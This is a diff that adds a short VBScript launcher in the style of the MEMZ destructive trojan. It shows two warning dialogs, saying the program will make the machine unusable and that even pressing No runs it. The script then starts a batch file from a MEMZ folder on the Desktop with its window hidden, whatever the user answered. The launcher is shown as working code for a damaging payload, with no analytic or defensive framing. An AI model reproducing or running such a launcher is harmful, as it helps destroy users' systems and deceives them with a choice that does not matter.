@@ -1,0 +1,5 @@
+X=MsgBox( "The software you just executed considered malware.                  This malware will harm your computer and makes it unuseable.                                                                                      If you are seeing this message without knowing what you just executed, simply press No and this malware will execute also :D.                                                                                                    If you know what this malware does and are using a safe enviroment to test, press Yes to start it.                                                                                                                                                 DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSEABLE MACHINE?" ,4+48, "MEMZ")
+X=MsgBox( "THIS IS THE LAST USELESS WARNING!                                        THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!                                                                  STILL EXECUTE IT?" ,4+48, "MEMZ")
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.Run chr(34) & "%userprofile%\Desktop\MEMZ\main.bat" & Chr(34), 0
+Set WshShell = Nothing
